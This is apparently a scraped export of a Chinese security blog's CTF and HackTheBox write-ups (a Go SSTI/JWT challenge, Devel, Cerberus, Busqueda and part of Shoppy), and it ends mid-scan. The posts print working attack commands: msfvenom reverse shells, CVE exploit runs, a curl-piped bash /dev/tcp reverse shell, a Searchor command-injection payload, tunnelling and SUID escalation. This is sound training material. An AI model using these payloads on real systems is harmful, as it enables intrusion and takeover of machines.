claims) return token.SignedString([]byte(secret_key)) } SSTI注入参考：https://forum.butian.net/share/1286 常规思路可以注入{{.}}或{{.secret_key}}来读secret_key属性，但此处由于root_handler()函数得到的acc是数组中的地址，也就是get_account函数通过在全局变量acc数组中查找我们的用户，这种情况下直接注入{{.secret_key}}会返回空，所以此处只能用{{.}}来返回全部属性 注册、认证获取jwt的请求和响应如下 /regist?id={{.}}&amp;pw=password {\"status\":true,\"msg\":\"\"} /auth?id={{.}}&amp;pw=password {\"status\":true,\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.0Lz_3fTyhGxWGwZnw3hM_5TzDfrk0oULzLWF4rRfMss\"} 在根目录传入X-Token头部，成功读到secret_key 伪造jwt，修改如下 在/flag传入伪造的jwt，获取flag 参考https://blog.csdn.net/weixin_46081055/article/details/124201444 https://tyskill.github.io/posts/gossti/ 完整源码package main import ( \"encoding/json\" \"fmt\" \"log\" \"net/http\" \"os\" \"text/template\" \"github.com/golang-jwt/jwt\" ) type Account struct { id string pw string is_admin bool secret_key string } type AccountClaims struct { Id string `json:\"id\"` Is_admin bool `json:\"is_admin\"` jwt.StandardClaims } type Resp struct { Status bool `json:\"status\"` Msg string `json:\"msg\"` } type TokenResp struct { Status bool `json:\"status\"` Token string `json:\"token\"` } var acc []Account var secret_key = os.Getenv(\"KEY\") var flag = os.Getenv(\"FLAG\") var admin_id = os.Getenv(\"ADMIN_ID\") var admin_pw = os.Getenv(\"ADMIN_PW\") func clear_account() { acc = acc[:1] } func get_account(uid string) Account { for i := range acc { if acc[i].id == uid { return acc[i] } } return Account{} } func jwt_encode(id string, is_admin bool) (string, error) { claims := AccountClaims{ id, is_admin, jwt.StandardClaims{}, } token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) return token.SignedString([]byte(secret_key)) } func jwt_decode(s string) (string, bool) { token, err := jwt.ParseWithClaims(s, &amp;AccountClaims{}, func(token *jwt.Token) (interface{}, error) { return []byte(secret_key), nil }) if err != nil { fmt.Println(err) return \"\", false } if claims, ok := token.Claims.(*AccountClaims); ok &amp;&amp; token.Valid { return claims.Id, claims.Is_admin } return \"\", false } func auth_handler(w http.ResponseWriter, r *http.Request) { uid := r.FormValue(\"id\") upw := r.FormValue(\"pw\") if uid == \"\" || upw == \"\" { return } if len(acc) &gt; 1024 { clear_account() } user_acc := get_account(uid) if user_acc.id != \"\" &amp;&amp; user_acc.pw == upw { token, err := jwt_encode(user_acc.id, user_acc.is_admin) if err != nil { return } p := TokenResp{true, token} res, err := json.Marshal(p) if err != nil { } w.Write(res) return } w.WriteHeader(http.StatusForbidden) return } func regist_handler(w http.ResponseWriter, r *http.Request) { uid := r.FormValue(\"id\") upw := r.FormValue(\"pw\") if uid == \"\" || upw == \"\" { return } if get_account(uid).id != \"\" { w.WriteHeader(http.StatusForbidden) return } if len(acc) &gt; 4 { clear_account() } new_acc := Account{uid, upw, false, secret_key} acc = append(acc, new_acc) p := Resp{true, \"\"} res, err := json.Marshal(p) if err != nil { } w.Write(res) return } func flag_handler(w http.ResponseWriter, r *http.Request) { token := r.Header.Get(\"X-Token\") if token != \"\" { id, is_admin := jwt_decode(token) if is_admin == true { p := Resp{true, \"Hi \" + id + \", flag is \" + flag} res, err := json.Marshal(p) if err != nil { } w.Write(res) return } else { w.WriteHeader(http.StatusForbidden) return } } } func root_handler(w http.ResponseWriter, r *http.Request) { token := r.Header.Get(\"X-Token\") if token != \"\" { id, _ := jwt_decode(token) acc := get_account(id) tpl, err := template.New(\"\").Parse(\"Logged in as \" + acc.id) if err != nil { } tpl.Execute(w, &amp;acc) } else { return } } func main() { admin := Account{admin_id, admin_pw, true, secret_key} acc = append(acc, admin) http.HandleFunc(\"/\", root_handler) http.HandleFunc(\"/auth\", auth_handler) http.HandleFunc(\"/flag\", flag_handler) http.HandleFunc(\"/regist\", regist_handler) log.Fatal(http.ListenAndServe(\"0.0.0.0:11000\", nil)) }","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"HTB-Devel","slug":"HTB11-Devel-Easy","date":"2023-07-31T09:49:00.000Z","updated":"2023-08-10T08:51:30.436Z","comments":true,"path":"posts/97f065fe.html","link":"","permalink":"https://wa0er.github.io/posts/97f065fe.html","excerpt":"","text":"HTB-Devel一、思路概要1.端口扫描发现存在可匿名登录的FTP服务，主页响应包发现是ASP.NET语言； 2.msfvenom制作aspx木马反弹shell； 3.systeminfo发现windows 7 build 7600没打补丁； 4.MS11-046提权。 二、信息收集nmap端口扫描 开放端口：21（ftp）、80（http），其中ftp允许匿名登录 浏览器访问靶机IP，主页如下，访问iisstart.htm页面一样 Burp抓包可看到响应包中X-Powered-By字段值，说明网站使用ASP.NET语言，可以尝试ftp传一个aspx的木马 在本地kali查找aspx木马，此处选择用seclists的（seclists是github的一个开源字典项目） 如下命令复制到当前目录 cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx ./ 匿名连接FTP服务并上传aspx木马 查看，木马被传到网站根目录 访问木马，执行命令成功，接下来用msfvenom生成aspx木马反弹shell 三、msfvenom制作aspx木马反弹shell可用如下命令查看支持的格式和payload msfvenom --list formats msfvenom --list payloads | grep 'shell_reverse_tcp' 制作反弹shell木马 msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.5 LPORT=9898 -o reverse-shell.aspx 用FTP上传 ftp&gt; put reverse-shell.aspx 本地kali开启nc监听nc -lvnp 9898 浏览器访问：http://10.10.10.5/reverse-shell.aspx，成功获取shell 执行systeminfo命令查看主机信息，Win7 Build 7600没打补丁 google搜索关键字：microsoft windows 7 build 7600 exploit https://www.exploit-db.com/exploits/40564 EDB-ID是40564 四、MS11-046提权本地kali执行如下命令更新exploit数据库并查找EDB-ID为40564的exploit searchsploit -u searchsploit -m 40564 apt下载mingw-w64 apt update apt install mingw-w64 编译40564.c i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32 本地kali开启http服务 python3 -m http.server 80 靶机执行如下命令，下载编译好的40564.exe（执行命令后，稍等一分钟按一下回车） powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5:80/40564.exe', 'c:\\Users\\Public\\Downloads\\40564.exe')\" 可看到40564.exe已被下载到靶机 执行40564.exe，成功提权，Over！ flag位置 c:\\Users\\babis\\Desktop\\user.txt c:\\Users\\Administrator\\Desktop\\root.txt 参考https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/devel-writeup-w-o-metasploit https://0xdf.gitlab.io/2019/03/05/htb-devel.html 另一种以MSF为主的getshell、提权思路本地kali制作aspx木马 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=9899 -f aspx -o met_rev_9899.aspx ftp上传木马 ftp&gt; put met_rev_9899.aspx 启动MSF执行如下命令进行监听 msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost tun0 set lport 9899 run 新开一个终端执行如下命令访问aspx木马 curl http://10.10.10.5/met_rev_9899.aspx 可看到成功getshell 把shell会话（此处为session 1）放到后台，并查看可利用的exploit background use post/multi/recon/local_exploit_suggester set session 1 run 用ms10-015模块提权 use exploit/windows/local/ms10_015_kitrap0d set lhost tun0 set lport 9900 set session 1 run","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Cerberus","slug":"HTB10-Cerberus-Hard","date":"2023-07-24T08:53:00.000Z","updated":"2023-08-10T08:51:30.438Z","comments":true,"path":"posts/7761233f.html","link":"","permalink":"https://wa0er.github.io/posts/7761233f.html","excerpt":"","text":"HTB-Cerberus一、思路概要1.信息收集找到icinga服务； 2.CVE-2022-24716（目录遍历）发现域控主机和icinga账户； 3.CVE-2022-24715（RCE）获取www-data用户权限，linpeas分析发现/usr/bin/firejail； 4.CVE-2022-31214（Firejail本地提权）获取root权限，并读取SSSD缓存找到域控账户； 5.fscan扫域控主机端口发现5985（Winrm服务）； 6.chisel做代理将5985端口流量代理到本地，用evil-winrm登录域控主机； 7.发现ManageEngine ADSelfService Plus服务，chisel做socks代理，访问9251服务，MSF提权。 二、信息收集Nmap nmap -A 10.10.11.205 开放端口8080，URL：http://icinga.cerberus.local:8080/icingaweb2 添加域名到hosts文件 echo \"10.10.11.205 icinga.cerberus.local\" &gt;&gt; /etc/hosts 访问URL，界面如下 三、CVE-2022-24716（目录遍历）google搜索关键字：icinga exploit CVE-2022-24716：https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/ 访问：http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts 确认存在目录遍历，且可看到有域控，IP为172.16.22.1 又找到如下文章 https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/ Icinga官方配置文档：https://icinga.com/docs/icinga-web/latest/doc/03-Configuration/ 读到如下敏感信息 username = \"matthew\" password = \"IcingaWebPassword2023\" 成功登录 四、CVE-2022-24715（RCE）参考刚才的文章，复现远程代码执行漏洞CVE-2022-24715 先监听端口 nc -lvnp 9898 然后生成PEM文件 ssh-keygen -m pem 执行如下命令 Exploit：https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py python3 CVE-2022-24715.py -t http://icinga.cerberus.local:8080/icingaweb2/ -I 10.10.14.8 -P 9898 -u matthew -p IcingaWebPassword2023 -e cert.pem 注：图中IP（10.10.14.35）与命令不一致是由于靶机环境不稳定，打靶期间openvpn重连过 成功反弹到shell，用户www-data，权限比较低 切换成交互式shell，便于执行命令 python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 本地kali开启http服务，传一个linpeas到靶机（此HTTP服务建议一直开着，后续会传好几个文件） python3 -m http.server 80 靶机的shell窗口，依次执行如下命令 cd /tmp wget http://10.10.14.8:80/linpeas.sh chmod +x linpeas.sh ./linpeas.sh linpeas分析结果中，找到如下图的信息，/usr/bin/firejail不是一个常规文件 五、CVE-2022-31214（Firejail本地提权）google搜索关键字：firejail exploit https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25 把以上链接的代码复制到本地kali的CVE-2022-31214.py文件中，然后在靶机的shell窗口用wget从本地下载，依次执行如下命令 wget http://10.10.14.8:80/CVE-2022-31214.py chmod +x CVE-2022-31214.py python3 CVE-2022-31214.py 在本地kali开一个新终端窗口，再弹一个shell回来，然后依次执行下列命令，成功获取root权限 python3 -c 'import pty;pty.spawn(\"/bin/bash\")' firejail --join=94129 #此处94129换成对应生成的值 su - linpeas结果中，还看到如下内容 SSSD：https://sssd.io/docs/introduction.html 在如下目录位置查看缓存 root@icinga:/var/lib/sss/db# strings cache_cerberus.local.ldb matthew@cerberus.local $6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0 爆破出hash值 john -w=/usr/share/wordlists/rockyou.txt hash.txt 147258369 fscan扫域控主机（172.16.22.1）端口，看到5985端口开放 wget http://10.10.14.8:80/fscan_amd64 chmod +x fscan_amd64 ./fscan_amd64 -h 172.16.22.1 -p 1-65535 六、Winrm服务登录域控google关键词：5985端口 搜到Winrm服务 用chisel把域控主机5985端口流量转发到本地kali Kali以服务端运行chisel chisel server -p 9899 --reverse 靶机以客户端运行chisel wget http://10.10.14.8:80/chisel chmod +x chisel ./chisel client --max-retry-count=1 10.10.14.8:9899 R:5985:172.16.22.1:5985 靶机执行完上述命令后，在本地kali可看到如下界面，最后一行表示流量转发连接已建立 在本地kali用evil-winrm登录Winrm服务 evil-winrm -i 127.0.0.1 -u matthew -p 147258369 userflag在C:\\Users\\matthew\\Desktop目录下，依次执行如下命令成功获取userflag cd ../Desktop type user.txt 从本地kali传一个winPEAS到域控主机，运行一下，发现运行到一半会报错中断，也没什么有价值的 ./winPEASany.exe 在C:\\Program Files (x86)目录看到ManageEngine服务 进到ManageEngine目录，看到ADSelfService Plus服务 七、ManageEngine ADSelfService Plus服务提权google关键字：ManageEngine ADSelfService Plus port 官方文档：https://www.manageengine.com/products/self-service-password/help/admin-guide/Admin/connection.html 从官方文档中看到ADSelfService Plus默认端口是8888(http)和9251(https) 因为有http服务，所以需要做一个socks代理 本地kali以服务端运行chisel chisel server -p 9900 --reverse 靶机以客户端运行chisel cd \"C:\\Users\\matthew\\Desktop\" curl 10.10.14.8/chisel.exe -o chisel.exe ./chisel.exe client --max-retry-count=1 10.10.14.8:9900 R:1080:socks 靶机运行完上述命令后，本地kali可看到如下界面，表示socks代理已建立 目前为止，建立了两条代理路线 10.10.14.8（本地kali） 172.16.22.1（域控主机） 9899端口 5985端口（Winrm服务） 9900端口 1080（socks代理，为了连接9251端口服务） 在本地hosts文件添加如下条目，并把最开始添加的那条10.10.11.205的记录给注释掉 127.0.0.1 cerberus.local icinga.cerberus.local dc.cerberus.local 浏览器的代理插件修改代理如下 然后浏览器访问：https://dc.cerberus.local:9251，得到如下界面 用之前获得的账号密码登录 matthew@cerberus.local 147258369 登录成功是如下界面，在URL可看到guid，在F12控制台可看到请求头有一串编码 base64解码、格式化之后，得到如下代码，看到Issuer 启动MSF，搜索ADSelfService的exploit msfconsole search ADSelfService 选中exploit并设置参数（注意设置socks代理） use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966 set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f set ISSUER_URL http://dc.cerberus.local/adfs/services/trust set RHOSTS 172.16.22.1 set LHOST 10.10.14.8 set AutoCheck false set ReverseAllowProxy true set Proxies socks5:127.0.0.1:1080 run 运行exploit，成功获取system权限 参考https://hackmd.io/@b3n5/rJRSRUGBn https://blog.csdn.net/qq_58869808/article/details/129786875 https://www.ngui.cc/article/show-1006958.html?action=onClick","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Busqueda","slug":"HTB9-Busqueda","date":"2023-04-15T11:11:00.000Z","updated":"2023-08-31T07:58:33.863Z","comments":true,"path":"posts/d91931aa.html","link":"","permalink":"https://wa0er.github.io/posts/d91931aa.html","excerpt":"","text":"HTB-Busqueda一、思路概要1.信息收集发现命令注入； 2.命令注入反弹shell获取svc用户权限； 3.Git信息泄露密码； 4.sudo -l发现可suid提权； 5.suid提权获取root权限。 二、信息收集Nmap，先扫端口，后扫服务 开放端口：22（ssh）、80（http）；域名：searcher.htb 添加域名解析记录到本地hosts文件 echo \"10.10.11.208 searcher.htb\" &gt;&gt; /etc/hosts 浏览器访问http://searcher.htb/ 大致意思，是一个集成了多搜索引擎的搜索平台。 第一个框（Select your engine）是个下拉框，可选择各种搜索引擎； 第二个框（What do you want to search for）是想要搜索的内容； 此处尝试搜索引擎选择Apple，搜索内容为123 下面的选项Auto redirect，不勾选，搜索时会返回如下格式的链接；勾选，会重定向到指定搜索引擎 另外页面底部，可看到Flask框架和Searchor 2.4.0，所以后端是Python 三、命令注入搜索的同时用Burp抓包，测试发现query字段可能有注入，如下两张图。Sqlmap尝试post注入，无果 看了一下Github上Searchor的介绍：https://github.com/ArjunSharda/Searchor 根据CLI（Command-Line Interface）命令，推测一下，post参数传到CLI时，拼接大概如下（此处用123'和123\"测试，双引号时响应正常，单引号响应异常，所以参数值应该被单引号包裹） searchor engine 'query' --copy 例：searchor Apple '123' --copy 想办法在query参数位注入想要执行的命令 参考：https://realpython.com/python-eval-function/ compile()函数语法： compile() 用于将源代码编译为代码对象或AST模块对象。可以根据提供的模式使用exec()或eval()函数执行返回的代码对象，以构造代码对象。 语法：compile(source, filename, mode, flags=0, dont_inherit=False, optimize=-1) source: 必选项，表示要编译的源代码，可以是字符串、文件或AST（Abstract Syntax Tree）对象。 filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “&lt;string&gt;” 即可。 mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或“single”（编译单个语句）。 flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。 dont_inherit: 可选项，表示是否继承sys.flags和sys.__optimizations__模块中相关选项的值。 optimize: 可选项，指定编译器的优化级别，若设置为-1，表示使用默认优化级别。 自己本地用python测试一下，如下 test = compile(\"import os\\nos.system('id')\",\"&lt;String&gt;\",\"exec\") eval(test) 如图可以成功执行id命令 那就尝试修改请求包，传递如下query值，执行id命令（前面1'和后面'用于闭合，中间有空格的地方用加号连接。实际测试有没有加号都可以，但前后两个%2b需要加，且用空格和%20替代行不通） query=1'%2beval(compile(\"import+os\\nos.system('id')\",'&lt;String&gt;','exec'))%2b' 传到CLI后： searchor Apple '1' eval(compile(\"import os\\nos.system('id')\",'&lt;String&gt;','exec')) '' --copy 可看到有三个地方展示了回显：响应头部Location、响应内容&lt;a&gt;标签href值、响应内容&lt;a&gt;标签文本。且当前用户是svc 再用如下语句执行ls命令查看当前目录下内容 query=1'%2beval(compile(\"import+os\\nos.system('ls')\",'&lt;String&gt;','exec'))%2b' 有app.py和templates 然后执行cat app.py命令查看app.py内容 query=1'%2beval(compile(\"import+os\\nos.system('cat+app.py')\",'&lt;String&gt;','exec'))%2b' URL解码得如下代码，从代码中也可以看到post传参的逻辑 from flask import Flask, render_template, request, redirect from searchor import Engine import subprocess app = Flask(__name__) @app.route('/') def index(): return render_template('index.html', options=Engine.__members__, error='') @app.route('/search', methods=['POST']) def search(): try: engine = request.form.get('engine') query = request.form.get('query') auto_redirect = request.form.get('auto_redirect') if engine in Engine.__members__.keys(): arg_list = ['searchor', 'search', engine, query] r = subprocess.run(arg_list, capture_output=True) url = r.stdout.strip().decode() if auto_redirect is not None: return redirect(url, code=302) else: return url else: return render_template('index.html', options=Engine.__members__, error=\"Invalid engine!\") except Exception as e: print(e) return render_template('index.html', options=Engine.__members__, error=\"Something went wrong!\") if __name__ == '__main__': app.run(debug=False) 接下来尝试反弹shell 攻击机开启nc监听和http服务 nc -lvnp 9898 python3 -m http.server 80 攻击机新建一个反弹shell文件rev_shell.txt，内容如下 bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1 Burp修改请求包query参数如下 query=1'%2beval(compile(\"import+os\\nos.system('curl+10.10.14.7/rev_shell.txt|bash')\",'&lt;String&gt;','exec'))%2b' 发送请求包，成功反弹shell，获取svc用户权限 四、Git信息泄露查看当前目录下文件，看到有.git，尝试git-dump和Githack下载失败，只能硬看 看到config文件里有用户名密码 cody:jh1usoih2bkjaspwe92 PS：后面的gitea.searcher.htb是个子域，加进hosts文件看了一眼，是个类似git仓库的东西，有两个用户cody和administrator，估计也是一条路线，但没过多尝试 五、SUID提权在svc用户尝试执行sudo -l，发现提示需要-S参数输入密码 执行sudo -l -S，尝试密码，是上面cody的密码（PS：在HackTheBox遇见好几次这种张冠李戴的事…） 可看到有一条命令可以以root身份执行，sudo执行该命令 sudo /usr/bin/python3 /opt/scripts/system-checkup.py * 提示三个用法，前两个是查看docker容器的相关信息，用处不大，第三个尝试会报错，如下 sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup 想看一下/opt/scripts/system-checkup.py，没权限，就用find命令模糊查找full-checkup，发现有/opt/scripts/full-checkup.sh，但svc用户没有可写权限没法更改，那就尝试在当前目录/home/svc新建一个同名文件 靶机shell环境不方便编辑文件，我们在攻击机创建full-checkup.sh，内容如下 #!/bin/bash chmod +s /bin/bash 然后在靶机用wget把full-checkup.sh传过来，并添加可执行权限（注意需在/home/svc目录下操作，别的目录无可写权限） wget http://10.10.14.7/full-checkup.sh chmod +x full-checkup.sh 再次执行full-checkup选项，可看到/bin/bash已成功设置suid 执行bash -p成功获取root权限 Over！ 参考https://blog.csdn.net/qq_58869808/article/details/130050438","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Shoppy","slug":"HTB6-Shoppy","date":"2023-04-12T12:47:00.000Z","updated":"2023-08-31T07:58:00.775Z","comments":true,"path":"posts/9681db2a.html","link":"","permalink":"https://wa0er.github.io/posts/9681db2a.html","excerpt":"","text":"HTB-Shoppy一、思路概要 信息收集目录枚举得到/login页面； 万能密码登录/login页面； 再次万能密码拿到josh账户（非ssh账户）； 枚举子域得到mattermost子域； josh账户登录mattermost子域并分析页面拿到ssh账户； 连上ssh账户sudo -l发现可执行文件； 逆向分析可执行文件拿到deploy账户； docker提权获取root权限。 二、信息收集nmap（用如下两步，先扫全端口，再指定端口定向扫描服务、版本相关信息，有助于提升扫描速度） ┌──(root💀kali)-[~/Desktop] └─# nmap -p- --min-rate 10000 10.129.92.247 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-31 04:15 EDT Nmap scan report for 10.129.92.247 Host is up (0.33s latency). Not shown: 65532 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9093/tcp open copycat Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds ┌──(root💀kali)-[~/Desktop] └─# nmap -p 22,80,9093 -sCV 10.129.92.247 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-31 04:24 EDT Nmap scan report for 10.129.92.247 Host is up (0.32s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA) | 256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA) |_ 256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519) 80/tcp open http nginx 1.23.1 |_http-server-header: nginx/1.23.1 |_http-title: Did not follow redirect to http://shoppy.htb 9093/tcp open copycat? | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/plain; version=0.0.4; charset=utf-8 | Date: Fri, 31 Mar 2023 08:24:50 GMT | HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime. | TYPE go_gc_cycles_automatic_gc_cycles_total counter | go_gc_cycles_automatic_gc_cycles_total 15 | HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application. | TYPE go_gc_cycles_forced_gc_cycles_total counter | go_gc_cycles_forced_gc_cycles_total 0 | HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles. | TYPE go_gc_cycles_total_gc_cycles_total counter | go_gc_cycles_total_gc_cycles_total 15 | HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles. | TYPE go_gc_duration_seconds summary | go_gc_duration_seconds{quantile=\"0\"} 2.8824e-05 | go_gc_duration_seconds{quantile=\"0.25\"} 7.6212e-05 | go_gc_d | HTTPOptions: | HTTP/1.0 200 OK | Content-Type: text/plain; version=0.0.4; charset=utf-8 | Date: Fri, 31 Mar 2023 08:24:51 GMT | HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime. | TYPE go_gc_cycles_automatic_gc_cycles_total counter | go_gc_cycles_automatic_gc_cycles_total 15 | HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application. | TYPE go_gc_cycles_forced_gc_cycles_total counter | go_gc_cycles_forced_gc_cycles_total 0 | HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles. | TYPE go_gc_cycles_total_gc_cycles_total counter | go_gc_cycles_total_gc_cycles_total 15 | HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles. | TYPE go_gc_duration_seconds summary | go_gc_duration_seconds{quantile=\"0\"} 2.8824e-05 | go_gc_duration_seconds{quantile=\"0.25\"} 7.6212e-05 |_ go_gc_d 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9093-TCP:V=7.91%I=7%D=3/31%Time=642698D4%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x SF:20Request\")%r(GetRequest,152D,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\ SF:x20text/plain;\\x20version=0\\.0\\.4;\\x20charset=utf-8\\r\\nDate:\\x20Fri,\\x2 SF:031\\x20Mar\\x202023\\x2008:24:50\\x20GMT\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles_ SF:automatic_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycles\\x SF:20generated\\x20by\\x20the\\x20Go\\x20runtime\\.\\n#\\x20TYPE\\x20go_gc_cycles_ SF:automatic_gc_cycles_total\\x20counter\\ngo_gc_cycles_automatic_gc_cycles_ SF:total\\x2015\\n#\\x20HELP\\x20go_gc_cycles_forced_gc_cycles_total\\x20Count\\ SF:x20of\\x20completed\\x20GC\\x20cycles\\x20forced\\x20by\\x20the\\x20applicatio SF:n\\.\\n#\\x20TYPE\\x20go_gc_cycles_forced_gc_cycles_total\\x20counter\\ngo_gc SF:_cycles_forced_gc_cycles_total\\x200\\n#\\x20HELP\\x20go_gc_cycles_total_gc SF:_cycles_total\\x20Count\\x20of\\x20all\\x20completed\\x20GC\\x20cycles\\.\\n#\\x SF:20TYPE\\x20go_gc_cycles_total_gc_cycles_total\\x20counter\\ngo_gc_cycles_t SF:otal_gc_cycles_total\\x2015\\n#\\x20HELP\\x20go_gc_duration_seconds\\x20A\\x2 SF:0summary\\x20of\\x20the\\x20pause\\x20duration\\x20of\\x20garbage\\x20collecti SF:on\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_duration_seconds\\x20summary\\ngo_gc_d SF:uration_seconds{quantile=\\\"0\\\"}\\x202\\.8824e-05\\ngo_gc_duration_seconds{ SF:quantile=\\\"0\\.25\\\"}\\x207\\.6212e-05\\ngo_gc_d\")%r(HTTPOptions,1A5A,\"HTTP/ SF:1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x20text/plain;\\x20version=0\\.0\\.4;\\x SF:20charset=utf-8\\r\\nDate:\\x20Fri,\\x2031\\x20Mar\\x202023\\x2008:24:51\\x20GM SF:T\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles_automatic_gc_cycles_total\\x20Count\\x SF:20of\\x20completed\\x20GC\\x20cycles\\x20generated\\x20by\\x20the\\x20Go\\x20ru SF:ntime\\.\\n#\\x20TYPE\\x20go_gc_cycles_automatic_gc_cycles_total\\x20counter SF:\\ngo_gc_cycles_automatic_gc_cycles_total\\x2015\\n#\\x20HELP\\x20go_gc_cycl SF:es_forced_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycles\\x SF:20forced\\x20by\\x20the\\x20application\\.\\n#\\x20TYPE\\x20go_gc_cycles_force SF:d_gc_cycles_total\\x20counter\\ngo_gc_cycles_forced_gc_cycles_total\\x200\\ SF:n#\\x20HELP\\x20go_gc_cycles_total_gc_cycles_total\\x20Count\\x20of\\x20all\\ SF:x20completed\\x20GC\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_cycles_total_gc_cycl SF:es_total\\x20counter\\ngo_gc_cycles_total_gc_cycles_total\\x2015\\n#\\x20HEL SF:P\\x20go_gc_duration_seconds\\x20A\\x20summary\\x20of\\x20the\\x20pause\\x20du SF:ration\\x20of\\x20garbage\\x20collection\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_d SF:uration_seconds\\x20summary\\ngo_gc_duration_seconds{quantile=\\\"0\\\"}\\x202 SF:\\.8824e-05\\ngo_gc_duration_seconds{quantile=\\\"0\\.25\\\"}\\x207\\.6212e-05\\n SF:go_gc_d\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 122.77 seconds 开放端口：22（ssh）、80（http）、9093（copycat），获得域名shoppy.htb 将域名添加进本地hosts文件 echo \"10.129.92.247 shoppy.htb\" &gt;&gt; /etc/hosts 浏览器打开shoppy.htb 枚举子目录 ┌──(root💀kali)-[~/Desktop] └─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 100 -mc 200,302,301 -u http://shoppy.htb/FUZZ /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://shoppy.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200,302,301 ________________________________________________ [Status: 302, Size: 28, Words: 4, Lines: 